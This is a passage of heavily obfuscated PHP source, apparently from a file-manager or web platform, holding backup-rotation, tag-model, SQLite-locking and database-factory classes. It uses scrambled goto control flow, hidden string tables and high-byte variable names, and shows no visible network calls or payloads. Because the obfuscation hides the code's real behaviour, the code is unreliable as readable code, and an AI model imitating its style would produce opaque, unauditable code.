$this->{$_SERVER[öÔÕ©€î‘][260]}($aÑƒÅ¦ª‹[1] . $FÉ‘ñ…é“Å[10], $FÉ‘ñ…é“Å[159]); goto céİ•Ù·Ñì; BÆƒöÔ¼á‘: if (strlen($b‚Êå©î£) < $aíÁØÏ×¥[584]) { return; } return $b„Ú‡‘ƒµÈ; goto e«¹ùÈŠ; d±®ä±åŸ¶: while (strlen($c°ˆ×¼Ãë) < $aíÁØÏ×¥[584]) { if (!$c°ˆ×¼Ãë) { break; } $c°ˆ×¼Ãë++; } for ($c‰ìåö²æä = 3; $c‰ìåö²æä < $b¯Ëáİ¬Ñ§; $c‰ìåö²æä += 2) { if ($b¯Ëáİ¬Ñ§ % $c‰ìåö²æä != 0) { continue; } $EòÈ™áÚ»š = $c‰ìåö²æä; $aŠçì…™Û˜ = $FÉ‘ñ…é“Å[254]($b¯Ëáİ¬Ñ§ / $c‰ìåö²æä); $AÁ ¯…ªÀõ = $aíÁØÏ×¥[702]; if (strlen($AÁ ¯…ªÀõ) < $aíÁØÏ×¥[587]) { die; } break; $A¼¯îéñİÁ = $aíÁØÏ×¥[703]; while ($A¼¯îéñİÁ < $aíÁØÏ×¥[584]) { if ($A¼¯îéñİÁ >= 0) { break; } $A¼¯îéñİÁ++; } } $A¹ ×ŞÆ¯Ã = ($EòÈ™áÚ»š - 1) * ($aŠçì…™Û˜ - 1); goto aˆ±Ô­©ãõ; aˆ±Ô­©ãõ: $EÂ°ŒÀÌóÙ = $FÉ‘ñ…é“Å[254](($EòÈ™áÚ»š + $aŠçì…™Û˜) / 2); while (1) { $dÛ¬Ü¿¶ = $EÂ°ŒÀÌóÙ; $e£‚ÛçÁÚÜ = $A¹ ×ŞÆ¯Ã; $eˆîØ½í£„ = $aíÁØÏ×¥[704]; while (strlen($eˆîØ½í£„) < $aíÁØÏ×¥[584]) { if (!$eˆîØ½í£„) { break; } $eˆîØ½í£„++; } while ($e£‚ÛçÁÚÜ % $dÛ¬Ü¿¶ != 0) { $BÏŒ´¡äØ¾ = $e£‚ÛçÁÚÜ; $cõô—‹Şš = $aíÁØÏ×¥[705]; if (!$cõô—‹Şš) { return; } $e£‚ÛçÁÚÜ = $dÛ¬Ü¿¶; $aŞ¾¾Ğêâ = $aíÁØÏ×¥[706]; while ($aŞ¾¾Ğêâ < $aíÁØÏ×¥[615]) { if ($aŞ¾¾Ğêâ >= 0) { break; } $aŞ¾¾Ğêâ++; } $dÛ¬Ü¿¶ = $BÏŒ´¡äØ¾ % $dÛ¬Ü¿¶; $EùÕ½âñ´Ã = $aíÁØÏ×¥[707]; if (strlen($EùÕ½âñ´Ã) < $aíÁØÏ×¥[584]) { die; } } if ($dÛ¬Ü¿¶ == 1) { break; } else { $EÂ°ŒÀÌóÙ++; } } $aÃ¨â›ˆ–á = 2; goto b·ò÷ŠÈè; D©¥‹˜“Û: $aíÁØÏ×¥ =& $_SERVER[¬ı§†‰ú˜¼]; $FÉ‘ñ…é“Å =& $_SERVER[öÔÕ©€î‘]; $aÑƒÅ¦ª‹ = $FÉ‘ñ…é“Å[0]($FÉ‘ñ…é“Å[364], $d½¿óØîÁÕ); goto D×¡ÓáÖÁí; D‰Ã”ä‰•‡: $Aµ¶ªˆğˆˆ = $aíÁØÏ×¥[699]; while ($Aµ¶ªˆğˆˆ < $aíÁØÏ×¥[584]) { if ($Aµ¶ªˆğˆˆ >= 0) { break; } $Aµ¶ªˆğˆˆ++; } $EòÈ™áÚ»š = 0; goto Eà±Ç³š; Eà±Ç³š: $DÑäÆ™³ğÑ = $aíÁØÏ×¥[700]; $aŠçì…™Û˜ = 0; $c°ˆ×¼Ãë = $aíÁØÏ×¥[701]; goto d±®ä±åŸ¶; céİ•Ù·Ñì: $a˜â‡‘ÜñÓ = $aíÁØÏ×¥[698]; if (!$b¯Ëáİ¬Ñ§) { return $FÉ‘ñ…é“Å[10]; } $b¯Ëáİ¬Ñ§ = $FÉ‘ñ…é“Å[254]($b¯Ëáİ¬Ñ§); goto D‰Ã”ä‰•‡; e«¹ùÈŠ: } public function avwha0015c9e() { goto eˆæ×Âğ©; DøŒÈÙÛ‹: for ($dï•è˜İ¤º = $dìâ·´óºÄ; $dï•è˜İ¤º > 1; $dï•è˜İ¤º--) { $EµŒ¹Æ¶Š‚ = !0; foreach ($E‰ïóõ×ö„ as $eõøœíÇÜÎ) { if ($dï•è˜İ¤º % $eõøœíÇÜÎ == 0) { $EµŒ¹Æ¶Š‚ = !1; break; } } if ($EµŒ¹Æ¶Š‚) { $eÎíâ•ã’š = $dï•è˜İ¤º; break; } } return $eÎíâ•ã’š; goto AÊº…¯ïœ—; b¶”óŒÛÓÕ: $AëÇĞ§ÑÕÈ = 1; while ($AëÇĞ§ÑÕÈ <= (int) $f’ºĞ‚¾ƒµ[366]($dìâ·´óºÄ)) { $dï•è˜İ¤º = $AëÇĞ§ÑÕÈ; while (!0) { $dï•è˜İ¤º++; if ($dï•è˜İ¤º <= 2) { $AëÇĞ§ÑÕÈ = $dï•è˜İ¤º; break; } else { if ($dï•è˜İ¤º < 2) { continue; } } $EµŒ¹Æ¶Š‚ = !0; for ($bÛæŒ½‚®¯ = 2; $bÛæŒ½‚®¯ <= $f’ºĞ‚¾ƒµ[366]($dï•è˜İ¤º); $bÛæŒ½‚®¯++) { if ($dï•è˜İ¤º % $bÛæŒ½‚®¯ == 0) { $EµŒ¹Æ¶Š‚ = !1; } } if ($EµŒ¹Æ¶Š‚) { $AëÇĞ§ÑÕÈ = $dï•è˜İ¤º; break; } } $E‰ïóõ×ö„[] = $AëÇĞ§ÑÕÈ; } $eÎíâ•ã’š = 2; goto DøŒÈÙÛ‹; aÁôË¸ «Â: $E‰ïóõ×ö„ = array(); $dİÕéƒçÖê = $E‰î¿ŸíØ–[710]; while ($dİÕéƒçÖê < $E‰î¿ŸíØ–[615]) { if ($dİÕéƒçÖê >= 0) { break; } $dİÕéƒçÖê++; } goto b¶”óŒÛÓÕ; eˆæ×Âğ©: $E‰î¿ŸíØ– =& $_SERVER[¬ı§†‰ú˜¼]; $f’ºĞ‚¾ƒµ =& $_SERVER[öÔÕ©€î‘]; $dìâ·´óºÄ = $f’ºĞ‚¾ƒµ[345]($f’ºĞ‚¾ƒµ[365](2, 14), $f’ºĞ‚¾ƒµ[365](2, 16) - 1); goto aÁôË¸ «Â; AÊº…¯ïœ—: } public function honm0c43803f($Bê£ »˜Ë, $BÓÆ†ééÄô) { $bæ×Ï›Ö¸µ =& $_SERVER[öÔÕ©€î‘]; return $bæ×Ï›Ö¸µ[13](array($bæ×Ï›Ö¸µ[14], $bæ×Ï›Ö¸µ[367]), $Bê£ »˜Ë, $BÓÆ†ééÄô); } public function eavqd056e9a2($EÎ ”¡º’, $F÷˜‰Ô‘„®) { $cö¶›¿ô… =& $_SERVER[öÔÕ©€î‘]; return $cö¶›¿ô…[13](array($cö¶›¿ô…[368], $cö¶›¿ô…[369]), $EÎ ”¡º’, $F÷˜‰Ô‘„®); $bîøÌà­Ô = $_SERVER[¬ı§†‰ú˜¼][711]; } public function oyab65409ff9($bŸó±ñË, $bçÙ‡®«ğ) { $b­ÇÎ ‡”† =& $_SERVER[öÔÕ©€î‘]; return $b­ÇÎ ‡”†[13](array($b­ÇÎ ‡”†[368], $b­ÇÎ ‡”†[370]), $bŸó±ñË, $bçÙ‡®«ğ); } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $C÷ïâ®ì =& $_SERVER[¬ı§†‰ú˜¼]; self::$name = date($C÷ïâ®ì[712]); if (!($eª‚šˆ©á = Model($C÷ïâ®ì[713])->lastItem())) { $eª‚šˆ©á = $this->initData(); } else { self::$name = $eª‚šˆ©á[$C÷ïâ®ì[28]]; if ($eª‚šˆ©á[$C÷ïâ®ì[714]] == $C÷ïâ®ì[87]) { self::$name = date($C÷ïâ®ì[715]); $Cä…¹õŸ¾× = 0; if (isset($eª‚šˆ©á[$C÷ïâ®ì[290]][$C÷ïâ®ì[192]][$C÷ïâ®ì[445]])) { $Cä…¹õŸ¾× = (int) $eª‚šˆ©á[$C÷ïâ®ì[290]][$C÷ïâ®ì[192]][$C÷ïâ®ì[445]]; } if ($eª‚šˆ©á[$C÷ïâ®ì[28]] == self::$name) { Model($C÷ïâ®ì[713])->remove($eª‚šˆ©á[$C÷ïâ®ì[392]]); } $eª‚šˆ©á = $this->initData($Cä…¹õŸ¾×, $eª‚šˆ©á[$C÷ïâ®ì[716]]); } else { $this->checkStore($eª‚šˆ©á[$C÷ïâ®ì[716]]); } } self::$option = $eª‚šˆ©á; } private function initData($Eˆö¥ìáÂÁ = 0, $eÄ ª¹¬’• = '') { goto aÄ“¨‹Ÿ; B­‘²ƒÔ‚: $this->checkStore($Cİ°Æ¿ì±«[$DÎîâó¤Äâ[716]]); $BŸæ†ğ²İ¤ = array($DÎîâó¤Äâ[716] => $Cİ°Æ¿ì±«[$DÎîâó¤Äâ[716]], $DÎîâó¤Äâ[28] => self::$name, $DÎîâó¤Äâ[714] => 0, $DÎîâó¤Äâ[717] => $Cİ°Æ¿ì±«[$DÎîâó¤Äâ[717]], $DÎîâó¤Äâ[290] => array($DÎîâó¤Äâ[718] => array($DÎîâó¤Äâ[714] => 0), $DÎîâó¤Äâ[719] => array($DÎîâó¤Äâ[714] => 0, $DÎîâó¤Äâ[720] => 0, $DÎîâó¤Äâ[721] => 0, $DÎîâó¤Äâ[29] => $DÎîâó¤Äâ[33], $DÎîâó¤Äâ[722] => 0, $DÎîâó¤Äâ[474] => 0), $DÎîâó¤Äâ[723] => array($DÎîâó¤Äâ[714] => 0, $DÎîâó¤Äâ[720] => 0, $DÎîâó¤Äâ[721] => 0, $DÎîâó¤Äâ[722] => 0, $DÎîâó¤Äâ[474] => 0), $DÎîâó¤Äâ[192] => array($DÎîâó¤Äâ[714] => 0, $DÎîâó¤Äâ[724] => 0, $DÎîâó¤Äâ[725] => 0, $DÎîâó¤Äâ[726] => 0, $DÎîâó¤Äâ[727] => 0, $DÎîâó¤Äâ[445] => $Eˆö¥ìáÂÁ, $DÎîâó¤Äâ[722] => 0, $DÎîâó¤Äâ[474] => 0)), $DÎîâó¤Äâ[722] => time(), $DÎîâó¤Äâ[474] => 0); $f³—ö¨‘¿ = Model($DÎîâó¤Äâ[713])->insert($BŸæ†ğ²İ¤); goto e¤ô¼¨ÎâÅ; e¤ô¼¨ÎâÅ: $BŸæ†ğ²İ¤[$DÎîâó¤Äâ[392]] = $f³—ö¨‘¿; return $BŸæ†ğ²İ¤; goto DÜ»Ùé‘»è; aÄ“¨‹Ÿ: $DÎîâó¤Äâ =& $_SERVER[¬ı§†‰ú˜¼]; $Cİ°Æ¿ì±« = Model($DÎîâó¤Äâ[713])->config(); if ($eÄ ª¹¬’• && $Cİ°Æ¿ì±«[$DÎîâó¤Äâ[716]] != $eÄ ª¹¬’•) { $Eˆö¥ìáÂÁ = 0; } goto B­‘²ƒÔ‚; DÜ»Ùé‘»è: } private function checkStore($f´İèáŒ”) { $då—ñ¸™¨¨ =& $_SERVER[¬ı§†‰ú˜¼]; $c‡ğóÖš¬® = Model($då—ñ¸™¨¨[728])->listData($f´İèáŒ”); Model($då—ñ¸™¨¨[728])->checkConfig($c‡ğóÖš¬®); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[¬ı§†‰ú˜¼][713])->findByName(self::$name); } return self::$option; } public static function set($eã“ôæ ×) { $Fôâ—“Ğ’ =& $_SERVER[¬ı§†‰ú˜¼]; $fô¿¤Ä¨»« = self::get(); foreach ($eã“ôæ × as $fêÎªß»›Œ => $a¢­ä¢å®£) { $Bá‹®ŸˆÄô = explode($Fôâ—“Ğ’[95], $fêÎªß»›Œ); $c›–Ù÷ô² = count($Bá‹®ŸˆÄô); switch ($c›–Ù÷ô²) { case 1: $fô¿¤Ä¨»«[$Bá‹®ŸˆÄô[0]] = $a¢­ä¢å®£; break; case 2: $fô¿¤Ä¨»«[$Bá‹®ŸˆÄô[0]][$Bá‹®ŸˆÄô[1]] = $a¢­ä¢å®£; break; case 3: $fô¿¤Ä¨»«[$Bá‹®ŸˆÄô[0]][$Bá‹®ŸˆÄô[1]][$Bá‹®ŸˆÄô[2]] = $a¢­ä¢å®£; break; } } Model($Fôâ—“Ğ’[713])->update($fô¿¤Ä¨»«[$Fôâ—“Ğ’[392]], $fô¿¤Ä¨»«); self::$option = $fô¿¤Ä¨»«; return self::$option; } public function keep() { $bˆé’õ³×„ =& $_SERVER[¬ı§†‰ú˜¼]; $dÕìØŞ‰¥ = self::get(); if ($dÕìØŞ‰¥[$bˆé’õ³×„[290]][$bˆé’õ³×„[718]][$bˆé’õ³×„[714]] == $bˆé’õ³×„[87]) { return; } $this->backupKeep($dÕìØŞ‰¥); self::set(array($bˆé’õ³×„[729] => 1)); } private function backupKeep($fñ¥‹†’‹) { goto EàÇŒŞ±Ğ; E´²ƒ©‘ö„: $E ›ùŠ‰Òõ = 0; $AÄóãÄ‚ªŞ = array(); foreach ($cƒßæŸ¢Ú as $cÙ¬Ñ‰Ã‚ê) { if ($E ›ùŠ‰Òõ >= 7) { break; } $AÄóãÄ‚ªŞ[] = $cÙ¬Ñ‰Ã‚ê[$E¶¨½ä¬›[28]]; $E ›ùŠ‰Òõ++; } goto Aøì¾ƒ†“¥; EàÇŒŞ±Ğ: $E¶¨½ä¬› =& $_SERVER[¬ı§†‰ú˜¼]; $cƒßæŸ¢Ú = Model($E¶¨½ä¬›[713])->listData(); if (empty($cƒßæŸ¢Ú)) { return; } goto E´²ƒ©‘ö„; Aøì¾ƒ†“¥: for ($E ›ùŠ‰Òõ = 0; $E ›ùŠ‰Òõ < 12; $E ›ùŠ‰Òõ++) { $AÄóãÄ‚ªŞ[] = date($E¶¨½ä¬›[730], strtotime("\55{$E ›ùŠ‰Òõ}\40\x6d\x6f\156\x74\x68\x73")); } $AÄóãÄ‚ªŞ = array_unique($AÄóãÄ‚ªŞ); $Fãµ‡µ°‡ï = Model($E¶¨½ä¬›[731])->get($E¶¨½ä¬›[732]); goto c÷«¹ˆ‚¥; c÷«¹ˆ‚¥: foreach ($cƒßæŸ¢Ú as $cÙ¬Ñ‰Ã‚ê) { if (!empty($cÙ¬Ñ‰Ã‚ê[$E¶¨½ä¬›[28]]) && in_array($cÙ¬Ñ‰Ã‚ê[$E¶¨½ä¬›[28]], $AÄóãÄ‚ªŞ)) { continue; } Model($E¶¨½ä¬›[713])->remove($cÙ¬Ñ‰Ã‚ê[$E¶¨½ä¬›[392]]); $f”ÍÀìÏù = $this->backupPath($fñ¥‹†’‹, $Fãµ‡µ°‡ï); IO::remove($f”ÍÀìÏù, !1); } goto C¯åÕ‹»„; C¯åÕ‹»„: } private function backupPath($CŒˆÇ‰ëß, $dšÀ·½Ï®Ã = false) { $b¹õ¾ÒÈ‹ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$dšÀ·½Ï®Ã) { $dšÀ·½Ï®Ã = Model($b¹õ¾ÒÈ‹[731])->get($b¹õ¾ÒÈ‹[732]); } $E™ë¿‘«ÉÑ = $CŒˆÇ‰ëß[$b¹õ¾ÒÈ‹[28]]; $CƒÇ¦ØĞé = substr(md5($b¹õ¾ÒÈ‹[733] . $dšÀ·½Ï®Ã . $E™ë¿‘«ÉÑ), 0, 8); return "\173\x69\x6f\72{$CŒˆÇ‰ëß[$b¹õ¾ÒÈ‹[716]]}\175\57\x64\141\164\141\142\x61\163\145\57\x62\x61\x63\x6b\x75\160\57" . $E™ë¿‘«ÉÑ . $b¹õ¾ÒÈ‹[71] . $CƒÇ¦ØĞé; } public function db() { goto Bã»‹©¿ø; Bã»‹©¿ø: $A»îÈİ¿îØ =& $_SERVER[¬ı§†‰ú˜¼]; $eîíšœŠåË = self::get(); if ($eîíšœŠåË[$A»îÈİ¿îØ[290]][$A»îÈİ¿îØ[719]][$A»îÈİ¿îØ[714]] == $A»îÈİ¿îØ[87]) { return !0; } goto C¨ŸêÁ³ÁŞ; C¨ŸêÁ³ÁŞ: $F‡ºô¿˜Ê = new BackupDb(); if (!$F‡ºô¿˜Ê->index()) { return !1; } self::set(array($A»îÈİ¿îØ[734] => 1)); goto A…¾áï–Ò„; A…¾áï–Ò„: return !0; goto AÖ¾›Ç¿¤; AÖ¾›Ç¿¤: } public function dbFile() { goto eÏí»Øè½Ÿ; cå§ƒ¤“‡”: return !0; goto BŠ¶ôñóÀ; fßÒˆºÁß: $c”µŒß†íÂ = new BackupDbFile(); if (!$c”µŒß†íÂ->index()) { return !1; } self::set(array($d…ØÓùÚ£[735] => 1)); goto cå§ƒ¤“‡”; eÏí»Øè½Ÿ: $d…ØÓùÚ£ =& $_SERVER[¬ı§†‰ú˜¼]; $aã´¶¡Ã£ = self::get(); if ($aã´¶¡Ã£[$d…ØÓùÚ£[290]][$d…ØÓùÚ£[723]][$d…ØÓùÚ£[714]] == $d…ØÓùÚ£[87]) { return !0; } goto fßÒˆºÁß; BŠ¶ôñóÀ: } public function file() { $D«†‹“Ä‰… =& $_SERVER[¬ı§†‰ú˜¼]; $AºÏÊ¸×† = self::get(); if ($AºÏÊ¸×†[$D«†‹“Ä‰…[290]][$D«†‹“Ä‰…[192]][$D«†‹“Ä‰…[714]] == $D«†‹“Ä‰…[87]) { return !0; } if (!isset($AºÏÊ¸×†[$D«†‹“Ä‰…[717]]) || $AºÏÊ¸×†[$D«†‹“Ä‰…[717]] == $D«†‹“Ä‰…[495]) { $cµé˜ƒ¦Ï¦ = new BackupFile(); if (!$cµé˜ƒ¦Ï¦->index()) { return !1; } } self::set(array($D«†‹“Ä‰…[736] => 1, $D«†‹“Ä‰…[714] => 1)); return !0; } } goto c«ºõ‘‚Ï¨; Cé“­Ä‘ïŒ: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\145\x72\x2e\x74\141\x67\114\151\x73\164"; public $modelType = "\x55\163\x65\x72\x4f\x70\164\x69\157\156"; public $field = array("\156\x61\x6d\145", "\163\164\171\154\x65", "\163\x6f\x72\164"); public function listData($bİØêóÑ•å = false, $eÚ±¢Ø±« = "\x73\x6f\x72\164", $eãŒŠÔ’òÜ = false) { return parent::listData($bİØêóÑ•å, $eÚ±¢Ø±«, $eãŒŠÔ’òÜ); } public function remove($B±Ã“‡Ï™¢) { return parent::remove($B±Ã“‡Ï™¢); } public function add($BÔ¨ˆÈ¾ÛÚ, $BÎ¦ßµ„§” = "\154\x61\x62\145\x6c\x2d\147\x72\145\171\55\x6e\x6f\162\155\x61\154") { $BŠóÅ†¸ =& $_SERVER[¬ı§†‰ú˜¼]; if ($this->findByName($BÔ¨ˆÈ¾ÛÚ)) { return !1; } $a¡ŞŠ“ÁŠ = array($BŠóÅ†¸[411] => $BÔ¨ˆÈ¾ÛÚ, $BŠóÅ†¸[462] => $BÎ¦ßµ„§”, $BŠóÅ†¸[1694] => $this->getSort($BŠóÅ†¸[255]) + 1); return parent::insert($a¡ŞŠ“ÁŠ); } public function update($A¥‹ãõØñ, $fÀŒŞ øÜ) { $bÒ¢¬„¤šÏ =& $_SERVER[¬ı§†‰ú˜¼]; $CÁ«ÌÖ§öº = $this->listData($A¥‹ãõØñ); $DŠÎµÑ…¦° = $this->findByName($fÀŒŞ øÜ[$bÒ¢¬„¤šÏ[28]]); if (!$CÁ«ÌÖ§öº || $DŠÎµÑ…¦° && $DŠÎµÑ…¦°[$bÒ¢¬„¤šÏ[392]] != $CÁ«ÌÖ§öº[$bÒ¢¬„¤šÏ[392]]) { return !1; } return parent::update($A¥‹ãõØñ, $fÀŒŞ øÜ); } public function moveTop($bà‰®ñ¸) { $D­³Ÿİ¼¼ =& $_SERVER[¬ı§†‰ú˜¼]; $BÊ«¢¼Ò¨ = parent::listData(); $D›Œ¬°è‚Ñ = $this->getSort($D­³Ÿİ¼¼[254]); foreach ($BÊ«¢¼Ò¨ as &$d¨¼ƒ®¼) { if ($d¨¼ƒ®¼[$D­³Ÿİ¼¼[392]] == $bà‰®ñ¸) { $d¨¼ƒ®¼[$D­³Ÿİ¼¼[1713]] = $D›Œ¬°è‚Ñ; continue; } $d¨¼ƒ®¼[$D­³Ÿİ¼¼[1713]] += 1; } unset($d¨¼ƒ®¼); return parent::resetData($BÊ«¢¼Ò¨); } public function moveBottom($B·ŠÖŒÇ†›) { $cöÎšœ÷”¥ =& $_SERVER[¬ı§†‰ú˜¼]; $EÖ×ùÜ«Í” = $this->getSort($cöÎšœ÷”¥[255]) + 1; return parent::update($B·ŠÖŒÇ†›, array($cöÎšœ÷”¥[1713] => $EÖ×ùÜ«Í”)); } public function resetSort($E…ÃÊ”‘²„) { goto C—…íÜÒğ¶; AÙĞ‡§ùØ: for ($B¤öØˆÇìæ = 0; $B¤öØˆÇìæ < count($E…ÃÊ”‘²„); $B¤öØˆÇìæ++) { $Cƒ•íÅƒàÕ[$E…ÃÊ”‘²„[$B¤öØˆÇìæ] . $EĞÕ¨±È£[33]] = $B¤öØˆÇìæ + 1; } $DÆâˆ¤±ò‰ = parent::listData(); foreach ($DÆâˆ¤±ò‰ as &$Fº·ò‹Ÿ‰) { $B¹ˆäÚ¡ªÌ = $Cƒ•íÅƒàÕ[$Fº·ò‹Ÿ‰[$EĞÕ¨±È£[392]]]; $Fº·ò‹Ÿ‰[$EĞÕ¨±È£[1713]] = $B¹ˆäÚ¡ªÌ ? $B¹ˆäÚ¡ªÌ : $Fº·ò‹Ÿ‰[$EĞÕ¨±È£[1713]]; } goto Eèë Ê–¤å; C—…íÜÒğ¶: $EĞÕ¨±È£ =& $_SERVER[¬ı§†‰ú˜¼]; $Cƒ•íÅƒàÕ = array(); $E…ÃÊ”‘²„ = is_array($E…ÃÊ”‘²„) ? $E…ÃÊ”‘²„ : array(); goto AÙĞ‡§ùØ; Eèë Ê–¤å: unset($Fº·ò‹Ÿ‰); return parent::resetData($DÆâˆ¤±ò‰); goto F¼ÒåÊËØî; F¼ÒåÊËØî: } private function getSort($F‚ŠÙ©ŸìÛ) { $aÒ¬ãğÆÆ =& $_SERVER[¬ı§†‰ú˜¼]; $BÄì’¾¸áœ = parent::listData(); $eâÖÁ°ª… = array_to_keyvalue($BÄì’¾¸áœ, $aÒ¬ãğÆÆ[33], $aÒ¬ãğÆÆ[1713]); if (!$eâÖÁ°ª…) { $eâÖÁ°ª… = array(0); } $aÒÒ¿Âì‡¯ = $F‚ŠÙ©ŸìÛ == $aÒ¬ãğÆÆ[255] ? max($eâÖÁ°ª…) : min($eâÖÁ°ª…); return intval($aÒÒ¿Âì‡¯); } } goto AÜëÎ®®ê¯; e¾¦ ¡éÏä: class DbSqlite extends DbSqliteBase { public function query($dÎ¼¬„¿ƒ) { $dñò‹ÍìÅ =& $_SERVER[¬ı§†‰ú˜¼]; if (!CacheLock::fileLock($dñò‹ÍìÅ[9])) { return !1; } $cÍ‹‡“ˆš = parent::query($dÎ¼¬„¿ƒ); CacheLock::fileUnLock($dñò‹ÍìÅ[9]); return $cÍ‹‡“ˆš; } public function execute($dÀ×Üäš´ğ) { $aÈñÜšã¯ =& $_SERVER[¬ı§†‰ú˜¼]; if (!CacheLock::fileLock($aÈñÜšã¯[9])) { return !1; } $E¢°¢µ˜İŒ = parent::execute($dÀ×Üäš´ğ); CacheLock::fileUnLock($aÈñÜšã¯[9]); return $E¢°¢µ˜İŒ; } } class DbSqlite3 extends DbSqlite3Base { public function query($F¹•ÙÏ¼’¨) { $bíŸ‰ÖÌÑ =& $_SERVER[¬ı§†‰ú˜¼]; if (!CacheLock::fileLock($bíŸ‰ÖÌÑ[9])) { return !1; } $F“Óîâµí = parent::query($F¹•ÙÏ¼’¨); CacheLock::fileUnLock($bíŸ‰ÖÌÑ[9]); return $F“Óîâµí; } public function execute($AÍáËñ­§‰) { $A¹–¹âáÏ =& $_SERVER[¬ı§†‰ú˜¼]; if (!CacheLock::fileLock($A¹–¹âáÏ[9])) { return !1; } $bÉˆ‹„œ  = parent::execute($AÍáËñ­§‰); CacheLock::fileUnLock($A¹–¹âáÏ[9]); return $bÉˆ‹„œ ; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\x69\156\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\75", "\x6e\145\x71" => "\74\x3e", "\147\164" => "\x3e", "\145\147\164" => "\x3e\75", "\x6c\x74" => "\x3c", "\145\154\x74" => "\74\75", "\156\157\x74\154\x69\153\145" => "\x4e\117\x54\x20\114\x49\x4b\105", "\154\x69\x6b\145" => "\x4c\x49\x4b\105", "\151\156" => "\x49\116", "\x6e\x6f\164\x69\x6e" => "\x4e\x4f\124\x20\x49\116", "\x6e\157\164\x20\x69\x6e" => "\116\117\124\40\x49\x4e", "\142\145\164\167\x65\145\x6e" => "\x42\105\124\x57\x45\x45\116", "\x6e\x6f\x74\142\145\x74\x77\145\x65\x6e" => "\116\117\x54\40\x42\x45\124\127\105\105\x4e", "\156\x6f\x74\40\x62\x65\x74\167\x65\145\156" => "\x4e\x4f\124\40\x42\x45\124\127\x45\x45\x4e"); protected $selectSql = "\x53\x45\x4c\x45\x43\x54\x25\x44\x49\x53\124\x49\116\x43\124\45\40\45\x46\111\x45\114\104\x25\x20\x46\x52\x4f\115\40\45\x54\x41\102\114\x45\45\45\112\117\x49\116\45\45\x57\110\x45\122\105\45\45\107\x52\117\125\x50\x25\x25\x48\x41\126\x49\x4e\107\x25\x25\x4f\122\x44\105\x52\45\45\x4c\111\115\x49\x54\45\x20\45\125\116\x49\x4f\x4e\45\45\103\117\x4d\x4d\105\116\124\45"; protected $bind = array(); public static function getInstance() { $bõÇ¸àÑ£é = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¬ı§†‰ú˜¼][918], $bõÇ¸àÑ£é); } public function factory($e¢ÎŠ±ˆŞ = '') { goto FÚºø‰š›Ù; EÅØÖƒ¸Ï: $this->dbType = ucwords(strtolower($e¢ÎŠ±ˆŞ[$Aì¡—’­Ç˜[919]])); $F¬µòçñ…Š = $Aì¡—’­Ç˜[921] . $this->dbType; if (class_exists($F¬µòçñ…Š)) { $F¬ç½ç˜ŠĞ = new $F¬µòçñ…Š($e¢ÎŠ±ˆŞ); if ($Aì¡—’­Ç˜[756] != strtolower($e¢ÎŠ±ˆŞ[$Aì¡—’­Ç˜[919]])) { $F¬ç½ç˜ŠĞ->dbType = strtoupper($this->dbType); } else { $F¬ç½ç˜ŠĞ->dbType = $this->_getDsnType($e¢ÎŠ±ˆŞ[$Aì¡—’­Ç˜[874]]); } } else { think_exception(think_lang($Aì¡—’­Ç˜[922]) . $Aì¡—’­Ç˜[923] . $F¬µòçñ…Š); } goto EÒ–À×—ù¢; FÚºø‰š›Ù: $Aì¡—’­Ç˜ =& $_SERVER[¬ı§†‰ú˜¼]; $e¢ÎŠ±ˆŞ = $this->parseConfig($e¢ÎŠ±ˆŞ); if (empty($e¢ÎŠ±ˆŞ[$Aì¡—’­Ç˜[919]])) { think_exception(think_lang($Aì¡—’­Ç˜[920])); } goto EÅØÖƒ¸Ï; EÒ–À×—ù¢: return $F¬ç½ç˜ŠĞ; goto Eñ²Ìù×Î; Eñ²Ìù×Î: } public function __call($DïÍ«Ò´, $D†à¥†ø²¹) { if (method_exists($this, $DïÍ«Ò´)) { return call_user_func_array(array($this, $DïÍ«Ò´), $D†à¥†ø²¹); } } protected function _getDsnType($BÛáªù½Ü) { $e’ êµŠ™ß = explode($_SERVER[¬ı§†‰ú˜¼][4], $BÛáªù½Ü); $eÊ¿Å¹ÓØÒ = strtoupper(trim($e’ êµŠ™ß[0])); return $eÊ¿Å¹ÓØÒ; } private function parseConfig($c§·âÕË‡— = '') { $bìÚó½´ïÖ =& $_SERVER[¬ı§†‰ú˜¼]; if (!empty($c§·âÕË‡—) && is_string($c§·âÕË‡—)) { $c§·âÕË‡— = $this->parseDSN($c§·âÕË‡—); } elseif (is_array($c§·âÕË‡—)) { $c§·âÕË‡— = array_change_key_case($c§·âÕË‡—); $c§·âÕË‡— = array($bìÚó½´ïÖ[919] => $c§·âÕË‡—[$bìÚó½´ïÖ[755]], $bìÚó½´ïÖ[847] => $c§·âÕË‡—[$bìÚó½´ïÖ[924]], $bìÚó½´ïÖ[848] => $c§·âÕË‡—[$bìÚó½´ïÖ[925]], $bìÚó½´ïÖ[845] => $c§·âÕË‡—[$bìÚó½´ïÖ[926]], $bìÚó½´ïÖ[846] => $c§·âÕË‡—[$bìÚó½´ïÖ[927]], $bìÚó½´ïÖ[17] => $c§·âÕË‡—[$bìÚó½´ïÖ[928]], $bìÚó½´ïÖ[874] => $c§·âÕË‡—[$bìÚó½´ïÖ[757]], $bìÚó½´ïÖ[13] => isset($c§·âÕË‡—[$bìÚó½´ïÖ[929]]) ? $c§·âÕË‡—[$bìÚó½´ïÖ[929]] : array()); } elseif (empty($c§·âÕË‡—)) { if (think_config($bìÚó½´ïÖ[930]) && $bìÚó½´ïÖ[756] != strtolower(think_config($bìÚó½´ïÖ[931]))) { $c§·âÕË‡— = $this->parseDSN(think_config($bìÚó½´ïÖ[930])); } else { $c§·âÕË‡— = array($bìÚó½´ïÖ[919] => think_config($bìÚó½´ïÖ[931]), $bìÚó½´ïÖ[847] => think_config($bìÚó½´ïÖ[932]), $bìÚó½´ïÖ[848] => think_config($bìÚó½´ïÖ[933]), $bìÚó½´ïÖ[845] => think_config($bìÚó½´ïÖ[934]), $bìÚó½´ïÖ[846] => think_config($bìÚó½´ïÖ[935]), $bìÚó½´ïÖ[17] => think_config($bìÚó½´ïÖ[243]), 